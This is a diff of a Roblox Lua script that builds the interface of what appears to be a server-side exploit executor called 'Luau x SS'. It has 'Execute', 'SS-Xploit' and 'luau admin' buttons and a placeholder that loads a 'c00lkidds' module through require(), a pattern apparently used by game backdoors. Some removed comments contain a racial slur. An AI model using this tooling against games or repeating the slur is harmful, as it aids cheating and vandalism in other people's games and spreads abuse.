@@ -1,317 +1,1110 @@
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local TweenService = game:GetService("TweenService")
 
-local function DeleteMyGUI()
-    local CoreGui = game:GetService("CoreGui")
-    local PlayerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
-    
-    local targetGUI = "super big olimen oh hell fucking no"
-    local found = false
-    
-    for _, item in pairs(CoreGui:GetChildren()) do
-        if item:IsA("ScreenGui") and item.Name == targetGUI then
-            item:Destroy()
-            found = true
-        end
-    end
-    
-    for _, item in pairs(PlayerGui:GetChildren()) do
-        if item:IsA("ScreenGui") and item.Name == targetGUI then
-            item:Destroy()
-            found = true
-        end
-    end
-    
-    for _, item in pairs(CoreGui:GetDescendants()) do
-        if item:IsA("ScreenGui") and item.Name == targetGUI then
-            item:Destroy()
-            found = true
-        end
-    end
-    
-    return found
-end
+local gui = Instance.new("ScreenGui")
+gui.Name = "NotificationGUI"
+gui.ResetOnSpawn = false
+gui.Parent = playerGui
 
-local function AdvancedDelete()
-    local CoreGui = game:GetService("CoreGui")
-    local targetName = "super big olimen oh hell fucking no"
-    
-    local foundGUI = CoreGui:FindFirstChild(targetName)
-    if foundGUI and foundGUI:IsA("ScreenGui") then
-        foundGUI:Destroy()
-        return
-    end
-end
+local container = Instance.new("Frame")
+container.Size = UDim2.new(0, 300, 1, -100)
+container.Position = UDim2.new(1, -320, 1, -20)
+container.AnchorPoint = Vector2.new(0, 1)
+container.BackgroundTransparency = 1
+container.ClipsDescendants = false
+container.Parent = gui
 
-local function NuclearOption()
-    local CoreGui = game:GetService("CoreGui")
-    local targetName = "super big olimen oh hell fucking no"
-    
-    for _, gui in pairs(CoreGui:GetChildren()) do
-        if gui:IsA("ScreenGui") and gui.Name == targetName then
-            gui:Destroy()
-        end
-    end
-end
+local layout = Instance.new("UIListLayout")
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+layout.Padding = UDim.new(0, 8)
+layout.VerticalAlignment = Enum.VerticalAlignment.Bottom -- 💡 Thay đổi hướng lên
+layout.Parent = container
 
-DeleteMyGUI() 
-AdvancedDelete()
-NuclearOption()
+local function showNotification(text)
+local toast = Instance.new("Frame")
+toast.Size = UDim2.new(1, 0, 0, 70)
+toast.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+toast.BackgroundTransparency = 0.15
+toast.ClipsDescendants = true
+toast.LayoutOrder = -os.clock() -- 💡 Đảm bảo toast mới nằm dưới
+toast.Parent = container
 
-                                                                                                                                                               local TweenService = game:GetService("TweenService")
-local luauxV5 = Instance.new("ScreenGui")
-luauxV5.Name = "super big olimen oh hell fucking no"
-luauxV5.IgnoreGuiInset = true
-luauxV5.ResetOnSpawn = false
-luauxV5.Parent = game:GetService("CoreGui") -- CoreGui is best👍🔥
-
-local Frame = Instance.new("Frame") -- is just a Instance for Frame
-Frame.AnchorPoint = Vector2.new(0.5, 0.5)
-Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
-Frame.Size = UDim2.new(0.7, 0, 0.6, 0)
-Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Frame.BackgroundTransparency = 0.25
-Frame.BorderSizePixel = 1  Frame.BorderColor3 = Color3.fromRGB(20, 20, 20)
-Frame.Parent = luauxV5 -- dad is big oli men idk
-local Corner = Instance.new("UICorner")-- UICorner make My fucking gui best😍
-Corner.CornerRadius = UDim.new(0, 10)
-Corner.Parent = Frame
-local UIStroke = Instance.new("UIStroke")
-UIStroke.Thickness = 2
-UIStroke.Transparency = 0
-UIStroke.Parent = Frame
--- Loading Circle like luna yesss bro is good
-local Circle = Instance.new("ImageLabel")
-Circle.AnchorPoint = Vector2.new(1, 0.5)
-Circle.Position = UDim2.new(0.45, -10, 0.45, 0)
-Circle.Size = UDim2.new(0, 180, 0, 180)
-Circle.BackgroundTransparency = 1
-Circle.Image = "rbxassetid://80990588449079"
-Circle.ImageTransparency = 1
-Circle.Parent = Frame
-local Button = Instance.new("TextButton")
-Button.Size = UDim2.new(0, 150, 0, 40)
-Button.Position = UDim2.new(0.5, -50, 0.05, 0)
-Button.Text = "Toggle Ui"
-Button.Parent = luauxV5    Button.BackgroundTransparency = 0.35                            
-Button.AutoButtonColor = false                                                                                                local Corner = Instance.new("UICorner")
-Corner.CornerRadius = UDim.new(0, 5)   Button.BackgroundColor3 = Color3.fromRGB(20, 20, 20)    Button.TextColor3 = Color3.fromRGB(255, 255, 255) 
-Corner.Parent = Button    Button.Visible = false 
--- Title means: u are skids stop scrolling now
-local Title = Instance.new("TextLabel")
-Title.AnchorPoint = Vector2.new(0, 0.5)
-Title.Position = UDim2.new(0.45, 10, 0.4, 0)
-Title.Size = UDim2.new(0.5, 0, 0.2, 0)
-Title.BackgroundTransparency = 1
-Title.Font = Enum.Font.GothamBold
-Title.Text = "luau x SS V5.1 big update"
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.TextTransparency = 1
-Title.TextScaled = true
-Title.Parent = Frame
-
--- nott tuff
-local Subtitle = Instance.new("TextLabel")
-Subtitle.AnchorPoint = Vector2.new(0, 0)
-Subtitle.Position = UDim2.new(0.46, 10, 0.55, 0)
-Subtitle.Size = UDim2.new(0.5, 0, 0.1, 0)
-Subtitle.BackgroundTransparency = 1
-Subtitle.Font = Enum.Font.Gotham
-Subtitle.Text = "by gojohdkaisenkt"
-Subtitle.TextColor3 = Color3.fromRGB(200, 200, 200)
-Subtitle.TextTransparency = 1
-Subtitle.TextScaled = true
-Subtitle.Parent = Frame
-
-local Version = Instance.new("TextLabel")
-Version.AnchorPoint = Vector2.new(1, 1)
-Version.Position = UDim2.new(0.98, 0, 0.95, 0)
-Version.Size = UDim2.new(0.3, 0, 0.1, 0)
-Version.BackgroundTransparency = 1
-Version.Font = Enum.Font.Gotham
-Version.Text = "Beta 5.1" -- yes is luau X v5.1 super big update but... stop skids now
-Version.TextColor3 = Color3.fromRGB(220, 220, 220)
-Version.TextTransparency = 1
-Version.TextScaled = true
-Version.TextXAlignment = Enum.TextXAlignment.Right
-Version.Parent = Frame
-
--- 😒(lazy) don't skids it
-TweenService:Create(Circle, TweenInfo.new(1), {ImageTransparency = 0}):Play()
-TweenService:Create(Title, TweenInfo.new(1), {TextTransparency = 0}):Play()
-TweenService:Create(Subtitle, TweenInfo.new(1), {TextTransparency = 0}):Play()
-TweenService:Create(Version, TweenInfo.new(1), {TextTransparency = 0}):Play()
-
-pcall(function()
-task.spawn(function()
-while Circle.Parent and Circle.Visible do
-Circle.Rotation = (Circle.Rotation + 5) % 360
-task.wait(0.03)
-end
-end)
-end)
-wait(4)
-
-pcall(function()
-TweenService:Create(Circle, TweenInfo.new(1), {ImageTransparency = 1}):Play()
-TweenService:Create(Title, TweenInfo.new(1), {TextTransparency = 1}):Play()
-TweenService:Create(Subtitle, TweenInfo.new(1), {TextTransparency = 1}):Play()
-TweenService:Create(Version, TweenInfo.new(1), {TextTransparency = 1}):Play()
-end)
-wait(1)
-pcall(function()
-TweenService:Create(Frame, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-Size = UDim2.new(0.87, 0, 0.75, 0)
-}):Play() end) -- use end) to close function if you not dumbass NIGGER
-local function QFCS_fake_script() -- I lazy and my draggable is nil
-local script = Instance.new('LocalScript', Frame)
-
-local UIS = game:GetService("UserInputService")  
-function dragify(Frame)  
-    dragToggle = nil  
-    local dragSpeed = -1  
-    dragInput = nil  
-    dragStart = nil  
-    local dragPos = nil  
-    function updateInput(input)  
-        local Delta = input.Position - dragStart  
-        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)  
-        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.5), {Position = Position}):Play()  
-    end  
-    Frame.InputBegan:Connect(function(input)  
-        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then  
-            dragToggle = true  
-            dragStart = input.Position  
-            startPos = Frame.Position  
-            input.Changed:Connect(function()  
-                if input.UserInputState == Enum.UserInputState.End then  
-                    dragToggle = false  
-                end  
-            end)  
-        end  
-    end)  
-    Frame.InputChanged:Connect(function(input)  
-        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then  
-            dragInput = input  
-        end  
-    end)  
-    game:GetService("UserInputService").InputChanged:Connect(function(input)  
-        if input == dragInput and dragToggle then  
-            updateInput(input)  
-        end  
-    end)  
-end  
-  
-dragify(script.Parent)
-
-end
-coroutine.wrap(QFCS_fake_script)()
-local UIStroke = Instance.new("UIStroke")
-UIStroke.Thickness = 1
-UIStroke.Transparency = 0
-UIStroke.Parent = Frame
-pcall(function()
-local toggletab = "rbxassetid://112941463599795" -- ready for ImageLabel LoL skids
-local offtab = "rbxassetid://109863274414818" -- 😐
-local script = "rbxassetid://116592854241448"
-local home = "rbxassetid://11347112400"
-local Setting = "rbxassetid://14134158045"
-local X = "rbxassetid://112774396559653"
-local logo = "rbxassetid://123145425569096"
-local admin = "rbxassetid://5183840354"
-local game = "rbxassetid://94219228196230"
-local execute = "rbxassetid://84159029790324"
-local scanner = "rbxassetid://99625725727957"
-local Clear = "rbxassetid://105955025341798"
-local Error = "rbxassetid://5107154082"
-local success = "rbxassetid://82668563249216"
-local WARNING = "rbxassetid://85147473315465"
-local jumpscare = "rbxassetid://106510700539466"
-local Skybox = "rbxassetid://106510700539466"
-local localface = "rbxassetid://96074603352531"
-local discord = "rbxassetid://94434236999817"
-local decal = "rbxassetid://123694661930746"
-local player = game.Players.LocalPlayer.Name
-end)
-pcall(function() -- I just spam pcall function🤓👉
-pcall(function()
-pcall(function()
-end)
-end)
-end)
-local f = Instance.new("Frame")
-f.Size = UDim2.new(1, 0, 0.14, 0)
-f.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-f.BackgroundTransparency = 0.99
-f.BorderSizePixel = 2
-f.BorderColor3 = Color3.fromRGB(20, 20, 20)
-f.Parent = Frame
-local UIStroke = Instance.new("UIStroke")
-UIStroke.Thickness = 2
-UIStroke.Transparency = 0
-UIStroke.Parent = f
-local Corner = Instance.new("UICorner") -- ...
-Corner.CornerRadius = UDim.new(0, 10)
-Corner.Parent = f
-local Subtitl = Instance.new("TextLabel")
-Subtitl.Position = UDim2.new(0.06, 0, 0, 0)
-Subtitl.Size = UDim2.new(0.5, 0, 0.1, 0)
-Subtitl.BackgroundTransparency = 1
-Subtitl.Font = Enum.Font.Gotham
-Subtitl.Text = "luau x SS V5.1 | rework by gojohdkaisenkt"
-Subtitl.TextColor3 = Color3.fromRGB(255, 255, 255)
-Subtitl.TextTransparency = 0
-Subtitl.TextScaled = true
-Subtitl.Parent = Frame
-local img = Instance.new("ImageLabel")
-img.Size = UDim2.new(0, 40, 0, 50) -- khung ô ảnh
-img.Position = UDim2.new(0, 5, 0.5, -20)
-img.BackgroundTransparency = 1
-img.Image = "rbxassetid://123145425569096"
-img.Parent = f
-
--- ts pmo🥀🥀💔
-local aspect = Instance.new("UIAspectRatioConstraint")
-aspect.AspectRatio = 1.2
-aspect.Parent = img
-
-local toggle = Instance.new("TextButton")
-toggle.Size = UDim2.new(0, 40, 0, 40)
-toggle.Position = UDim2.new(0.93, 0, 0.005, 0)
-toggle.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
-toggle.Font = Enum.Font.GothamBold
-toggle.Parent = Frame
-toggle.Text = "X"     toggle.TextSize = 35
-toggle.BorderSizePixel = 1  toggle.BorderColor3 = Color3.fromRGB(0, 0, 0)                                                                                                                                                 local corner = Instance.new("UICorner")
+local corner = Instance.new("UICorner")
 corner.CornerRadius = UDim.new(0, 10)
-corner.Parent = toggle
-toggle.BackgroundTransparency = 0.9
-local aspect = Instance.new("UIAspectRatioConstraint")
-aspect.AspectRatio = 1
-aspect.Parent = icon
+corner.Parent = toast
 
-local UIStroke = Instance.new("UIStroke")
-UIStroke.Thickness = 1
-UIStroke.Transparency = 0
-UIStroke.Parent = toggle
-UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-pcall(function()
-toggle.MouseButton1Down:connect(function()
-TweenService:Create(Frame, TweenInfo.new(1.5), {BackgroundTransparency = 1}):Play() wait(1) Frame.Visible = false Button.Visible = true end) end)                          
-          Button.MouseButton1Down:connect(function()          
-                 Button.Visible = false Frame.Visible = true TweenService:Create(Frame, TweenInfo.new(1.5), {BackgroundTransparency = 0.25}):Play() end)                                                
- local Scroll = Instance.new("ScrollingFrame")
-Scroll.Size = UDim2.new(0, 50, 0.8, 0) 
-Scroll.Position = UDim2.new(0, 0, 0.15, -1)
-Scroll.CanvasSize = UDim2.new(0, 0, 0, 0) 
-Scroll.ScrollBarThickness = 6
-Scroll.BackgroundTransparency = 0.99
-Scroll.Parent = Frame
-Scroll.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-local Layout = Instance.new("UIListLayout")
-Layout.Parent = Scroll
-Layout.SortOrder = Enum.SortOrder.LayoutOrder
-Layout.Padding = UDim.new(0, 5)
-pcall(function()
-Layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-    Scroll.CanvasSize = UDim2.new(0, 0, 0, Layout.AbsoluteContentSize.Y)
-end) end)
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, -20, 1, -30)
+label.Position = UDim2.new(0, 10, 0, 10)
+label.BackgroundTransparency = 1
+label.TextColor3 = Color3.new(1, 1, 1)
+label.TextScaled = true
+label.Font = Enum.Font.GothamSemibold
+label.Text = text
+label.TextWrapped = true
+label.TextTransparency = 1
+label.Parent = toast
+
+local progressBar = Instance.new("Frame")
+progressBar.Size = UDim2.new(0, 0, 0, 4)
+progressBar.Position = UDim2.new(0, 0, 1, -4)
+progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+progressBar.BorderSizePixel = 0
+progressBar.Parent = toast
+
+local progressCorner = Instance.new("UICorner")
+progressCorner.CornerRadius = UDim.new(1, 0)
+progressCorner.Parent = progressBar
+
+toast.Position = UDim2.new(1, 320, 0, 0)
+local tweenIn = TweenService:Create(toast, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {
+Position = UDim2.new(0, 0, 0, 0),
+BackgroundTransparency = 0.15
+})
+local textTweenIn = TweenService:Create(label, TweenInfo.new(0.4), {
+TextTransparency = 0
+})
+
+tweenIn:Play()
+textTweenIn:Play()
+
+local duration = 4
+local progressTween = TweenService:Create(progressBar, TweenInfo.new(duration, Enum.EasingStyle.Linear), {
+Size = UDim2.new(1, 0, 0, 4)
+})
+progressTween:Play()
+
+task.delay(duration, function()
+local tweenOut = TweenService:Create(toast, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
+Position = UDim2.new(1, 320, 0, 0),
+BackgroundTransparency = 1
+})
+local textTweenOut = TweenService:Create(label, TweenInfo.new(0.4), {
+TextTransparency = 1
+})
+
+tweenOut:Play()    
+textTweenOut:Play()    
+
+tweenOut.Completed:Connect(function()    
+	toast:Destroy()    
+end)
+
+end)
+
+end
+
+
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+local gui = Instance.new("ScreenGui", playerGui)
+gui.Name = "LuauBallIntro"
+gui.ResetOnSpawn = false
+
+local ball = Instance.new("TextLabel")
+ball.Size = UDim2.new(0, 60, 0, 60)
+ball.Position = UDim2.new(0.5, 0, 1.2, 0) -- từ dưới lên
+ball.AnchorPoint = Vector2.new(0.5, 0.5)
+ball.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ball.Text = ""
+ball.BorderSizePixel = 0
+ball.ZIndex = 5
+ball.Parent = gui
+Instance.new("UICorner", ball).CornerRadius = UDim.new(1, 0)
+
+local image = Instance.new("ImageLabel", ball)
+image.Size = UDim2.new(0.7, 0, 0.7, 0)
+image.Position = UDim2.new(0.5, 0, 0.5, 0)
+image.AnchorPoint = Vector2.new(0.5, 0.5)
+image.BackgroundTransparency = 1
+image.Image = "rbxassetid://123145425569096"
+
+TweenService:Create(ball, TweenInfo.new(1.4, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+	Position = UDim2.new(0.5, 0, 0.4, 0) -- đi lên quá giữa một tí
+}):Play()
+
+task.delay(1.4, function()
+	TweenService:Create(ball, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+		Position = UDim2.new(0.5, 0, 0.5, 0)
+	}):Play()
+end)
+
+task.delay(2.2, function()
+	local frame = Instance.new("Frame")
+	frame.Size = UDim2.new(0, 0, 0, 0)
+	frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+	frame.AnchorPoint = Vector2.new(0.5, 0.5)
+	frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	frame.Parent = gui
+	Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 20)
+
+	local nameLabel = Instance.new("TextLabel", frame)
+	nameLabel.Size = UDim2.new(1, -20, 0, 30)
+	nameLabel.Position = UDim2.new(0.5, 0, 0.9, 0)
+	nameLabel.AnchorPoint = Vector2.new(0.5, 1)
+	nameLabel.BackgroundTransparency = 1
+	nameLabel.Font = Enum.Font.GothamBold
+	nameLabel.Text = "Luau x SS"
+	nameLabel.TextColor3 = Color3.new(1, 1, 1)
+	nameLabel.TextScaled = true
+
+	local frameImage = image:Clone()
+	frameImage.Size = UDim2.new(0, 200, 0, 150)
+	frameImage.Position = UDim2.new(0.5, 0, 0.4, 0)
+	frameImage.Parent = frame
+
+	TweenService:Create(ball, TweenInfo.new(0.3), {
+		Size = UDim2.new(0, 0, 0, 0),
+		BackgroundTransparency = 1
+	}):Play()
+	game.Debris:AddItem(ball, 1)
+
+	frame.Visible = true
+	TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+		Size = UDim2.new(0, 320, 0, 220)
+	}):Play()
+
+	task.delay(3, function()
+		TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
+			Size = UDim2.new(0, 0, 0, 0)
+		}):Play()
+		task.wait(0.5)
+		frame:Destroy()
+	end)
+end)
+showNotification("hi ".. game.Players.LocalPlayer.Name .."")
+task.wait(1)                                                                                                                                                      showNotification("thank for use my script")
+local cornerGui = Instance.new("ScreenGui")
+cornerGui.Name = "CornerToggleGui"
+cornerGui.Parent = game.CoreGui
+cornerGui.ResetOnSpawn = false
+cornerGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+local toggleButton = Instance.new("TextButton")
+toggleButton.Size = UDim2.new(0, 100, 0, 40)
+toggleButton.Position = UDim2.new(0, 10, 1, -10)
+toggleButton.AnchorPoint = Vector2.new(0, 1)
+toggleButton.Text = "Show"
+toggleButton.Font = Enum.Font.SourceSansBold
+toggleButton.TextScaled = true
+toggleButton.TextColor3 = Color3.new(1, 1, 1)
+toggleButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+toggleButton.Parent = cornerGui
+
+Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0, 20)
+
+local contentFrame = Instance.new("Frame")
+contentFrame.Size = UDim2.new(0, 560, 0, 279)
+contentFrame.Position = UDim2.new(-10, 0, -10, 0)
+contentFrame.AnchorPoint = Vector2.new(0, 1)
+contentFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+contentFrame.BorderSizePixel = 0
+contentFrame.ZIndex = 0
+contentFrame.Parent = cornerGui
+
+Instance.new("UICorner", contentFrame)
+
+local Name = Instance.new("TextLabel")
+Name.Name = "Name"
+Name.Parent = contentFrame
+Name.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Name.Size = UDim2.new(0, 555, 0, 30)
+Name.BorderColor3 = Color3.new(0, 0, 0)
+Name.Font = Enum.Font.GothamBold
+Name.Text = "Luau X SS"
+Name.TextColor3 = Color3.fromRGB(255, 255, 255)
+Name.TextScaled = true
+Name.TextWrapped = true
+Name.Visible = true
+
+Instance.new("UICorner", Name)
+local bigCircle = Instance.new("ImageLabel")
+bigCircle.Name = "BigCircle"
+bigCircle.Size = UDim2.new(0, 90, 0, 90)
+bigCircle.Position = UDim2.new(0, 0, 0, 0)
+bigCircle.AnchorPoint = Vector2.new(0.5, 0.5)
+bigCircle.BackgroundTransparency = 1
+bigCircle.Image = "rbxassetid://115075737237359"
+bigCircle.Parent = contentFrame
+bigCircle.Visible = true
+
+local smallCircle = Instance.new("ImageLabel")
+smallCircle.Name = "SmallCircle"
+smallCircle.Size = UDim2.new(0, 50, 0, 50)
+smallCircle.AnchorPoint = Vector2.new(0.5, 0.5)
+smallCircle.BackgroundTransparency = 1
+smallCircle.Image = "rbxassetid://86158485123944"
+smallCircle.Parent = bigCircle
+bigCircle.ZIndex = 9                                                                                                       smallCircle.ZIndex = 9
+local radius = 55
+local speed = 2
+local startAngle = math.rad(45)
+
+RunService.RenderStepped:Connect(function()
+local angle = startAngle + tick() * speed
+local x = math.cos(angle) * radius
+local y = math.sin(angle) * radius
+smallCircle.Position = UDim2.new(0.5, x, 0.5, y)
+end)
+
+local button = Instance.new("TextButton", contentFrame)
+button.Size = UDim2.new(0, 40, 0, 25)
+button.Position = UDim2.new(0.93, 0, 0, 0)
+button.Text = "?"
+button.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+button.TextColor3 = Color3.new(1, 1, 1)
+button.Font = Enum.Font.SourceSansBold
+button.TextScaled = true
+button.Visible = true
+button.AutoButtonColor = false
+
+local unfe = Instance.new("TextButton")
+unfe.Name = "unfe"
+unfe.Parent = contentFrame
+unfe.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
+unfe.BorderColor3 = Color3.fromRGB(0, 0, 0)
+unfe.BorderSizePixel = 0
+unfe.Position = UDim2.new(0, 0, 0.792114913, 0)
+unfe.Size = UDim2.new(0, 80, 0, 43)
+unfe.Font = Enum.Font.SourceSans
+unfe.Text = "Execute"
+unfe.TextColor3 = Color3.fromRGB(0, 0, 0)
+unfe.TextScaled = true
+unfe.TextSize = 14.000
+unfe.Visible = true
+unfe.TextWrapped = true
+
+local Clear = Instance.new("TextButton", contentFrame)
+Clear.Name = "Clear"
+Clear.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- Tạm để dễ thấy
+Clear.Position = UDim2.new(0.16, 0, 0.792114913, 0)
+Clear.Size = UDim2.new(0, 80, 0, 43)
+Clear.Font = Enum.Font.SourceSans
+Clear.Text = "Clear"
+Clear.TextColor3 = Color3.fromRGB(0, 0, 0)
+Clear.TextScaled = true
+Clear.TextWrapped = true
+Clear.ZIndex = 0
+Clear.Active = true
+Clear.Visible = true
+
+local wtf = Instance.new("TextButton", contentFrame)
+wtf.Name = "wth u Success decode moonsec v3?"
+wtf.Parent = contentFrame
+wtf.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
+wtf.BorderColor3 = Color3.fromRGB(0, 0, 0)
+wtf.BorderSizePixel = 0
+wtf.Position = UDim2.new(0.32, 0, 0.792114913, 0)
+wtf.Size = UDim2.new(0, 80, 0, 43)
+wtf.Font = Enum.Font.SourceSans
+wtf.Text = "scanner"
+wtf.TextColor3 = Color3.fromRGB(0, 0, 0)
+wtf.TextScaled = true
+wtf.TextSize = 14.000
+wtf.TextWrapped = true
+wtf.Visible = true
+
+local r6 = Instance.new("TextButton", contentFrame)
+r6.Name = "wth u Success decode moonsec v3?"
+r6.Parent = contentFrame
+r6.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
+r6.BorderColor3 = Color3.fromRGB(0, 0, 0)
+r6.BorderSizePixel = 0
+r6.Position = UDim2.new(0.48, 0, 0.792114913, 0)
+r6.Size = UDim2.new(0, 80, 0, 43)
+r6.Font = Enum.Font.SourceSans
+r6.Text = "r6"
+r6.TextColor3 = Color3.fromRGB(0, 0, 0)
+r6.TextScaled = true
+r6.TextSize = 14.000
+r6.TextWrapped = true
+r6.Visible = true
+
+local best = Instance.new("TextButton", contentFrame)
+best.Name = "wth u Success decode moonsec v3?"
+best.Parent = contentFrame
+best.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
+best.BorderColor3 = Color3.fromRGB(0, 0, 0)
+best.BorderSizePixel = 0
+best.Position = UDim2.new(0.80, 0, 0.792114913, 0)
+best.Size = UDim2.new(0, 80, 0, 43)
+best.Font = Enum.Font.SourceSans
+best.Text = "SS-Xploit"
+best.TextColor3 = Color3.fromRGB(0, 0, 0)
+best.TextScaled = true
+best.TextSize = 14.000
+best.Visible = true
+best.TextWrapped = true
+local l = Instance.new("TextButton", contentFrame)
+l.Name = "wth?"
+l.Parent = contentFrame
+l.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
+l.BorderColor3 = Color3.fromRGB(0, 0, 0)
+l.BorderSizePixel = 0
+l.Position = UDim2.new(0.64, 0, 0.792114913, 0)
+l.Size = UDim2.new(0, 80, 0, 43)
+l.Font = Enum.Font.SourceSans
+l.Text = "luau admin"
+l.TextColor3 = Color3.fromRGB(0, 0, 0)
+l.TextScaled = true
+l.TextSize = 14.000
+l.TextWrapped = true
+l.Visible = true
+l.ZIndex = 4                                                                                                                                                                                                    -- Thêm đoạn này trước khi sử dụng frame2
+local frame2 = Instance.new("Frame")
+frame2.Name = "InfoFrame"
+frame2.Size = UDim2.new(0, 0, 0, 0)
+frame2.Position = UDim2.new(0.5, 0, 0.5, 0)
+frame2.AnchorPoint = Vector2.new(0.5, 0.5)
+frame2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame2.Visible = false
+frame2.Parent = contentFrame
+frame2.ZIndex = 6
+local label2 = Instance.new("TextLabel", frame2)
+label2.Size = UDim2.new(0.7, 0, 1, 0)
+label2.BackgroundTransparency = 1                                                                                  label2.Position = UDim2.new(0, 0, 0, 0)
+label2.TextColor3 = Color3.new(1, 1, 1)
+label2.Text = "luau x by gojohdkaisenkt v3.0.0 :D                                                                                   what upd 3                                                                                                                                                                   +admin selected player                                                                                                                                                                                                                                                                                                                      cre:                                                                                                                                                                    scripting: gojohdkaisenkt                                                                                                                                                                     Owner: gojohdkaisenkt"
+label2.TextScaled = true
+label2.Font = Enum.Font.SourceSans                                                                                                                                                                                     label2.ZIndex = 3                                                                                                                   local Script = Instance.new("TextBox", contentFrame)
+Script.Name = "Script"
+Script.BackgroundColor3 = Color3.new(255, 255, 255)
+Script.BorderColor3 = Color3.new(0, 0, 0)
+Script.Position = UDim2.new(0.0178571437, 0, 0.179211468, 0)
+Script.Size = UDim2.new(0, 540, 0, 156)
+Script.MultiLine = true
+Script.ClearTextOnFocus = false
+Script.Font = Enum.Font.Code
+Script.PlaceholderText = "Require(6666666666).load(\"c00lkidds\")"
+Script.Text = "scanner for use r6 and more"
+Script.TextColor3 = Color3.new(0, 0, 0)
+Script.TextSize = 25
+Script.ZIndex = 0
+Script.TextWrapped = true
+Script.TextXAlignment = Enum.TextXAlignment.Left
+Script.TextYAlignment = Enum.TextYAlignment.Top
+Script.Visible = true
+local frame3 = Instance.new("Frame")
+frame3.Name = "Frame3"
+frame3.Size = UDim2.new(0, 0, 0, 0) -- bắt đầu nhỏ
+frame3.Position = UDim2.new(0.5, 0, 0.5, 0)
+frame3.AnchorPoint = Vector2.new(0.5, 0.5)
+frame3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame3.Visible = false
+frame3.Parent = contentFrame                                                Instance.new("UICorner", frame3)
+frame3.ZIndex = 0                                                                                                     best.ZIndex = 6
+Instance.new("UICorner", Script)   
+Instance.new("UICorner", unfe)
+Instance.new("UICorner", Clear)
+Instance.new("UICorner", r6)
+Instance.new("UICorner", wtf)
+Instance.new("UICorner", best)
+Instance.new("UICorner", button)
+Instance.new("UICorner", Script)
+Instance.new("UICorner", label2)
+Instance.new("UICorner", contentFrame2)
+Instance.new("UICorner", frame2)
+Instance.new("UICorner", l)
+local frame3 = Instance.new("Frame")
+frame3.Name = "Frame3"
+frame3.Size = UDim2.new(0, 0, 0, 0)     -- sẽ phóng to lúc nhấn nút
+frame3.Position = UDim2.new(0.5, 0, 0.5, 0)
+frame3.AnchorPoint = Vector2.new(0.5, 0.5)
+frame3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame3.Visible = false
+frame3.ZIndex = 4
+frame3.Parent = contentFrame
+Instance.new("UICorner", frame3)
+local frame4 = Instance.new("Frame")
+frame4.Name = "Fra"
+frame4.Size = UDim2.new(0, 0, 0, 0)     -- sẽ phóng to lúc nhấn nút
+frame4.Position = UDim2.new(0.5, 0, 0.5, 0)
+frame4.AnchorPoint = Vector2.new(0.5, 0.5)
+frame4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame4.Visible = false
+frame4.ZIndex = 3
+frame4.Parent = contentFrame
+Instance.new("UICorner", frame3)
+Instance.new("UICorner", frame4)
+local scroll = Instance.new("ScrollingFrame")
+scroll.Name = "ScrollArea"
+scroll.Size = UDim2.new(0.9, 0, 0.8, 0)  -- dùng 90% chiều rộng, 80% chiều cao của frame3
+scroll.Position = UDim2.new(0.5, 0, 0.5, 0)
+scroll.AnchorPoint = Vector2.new(0.5, 0.5)
+scroll.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+scroll.BorderSizePixel = 0
+scroll.ScrollBarThickness = 8
+scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+scroll.ScrollingDirection = Enum.ScrollingDirection.Y
+scroll.ClipsDescendants = true
+scroll.ZIndex = 4
+scroll.Parent = frame3
+Instance.new("UICorner", scroll).CornerRadius = UDim.new(0, 12)
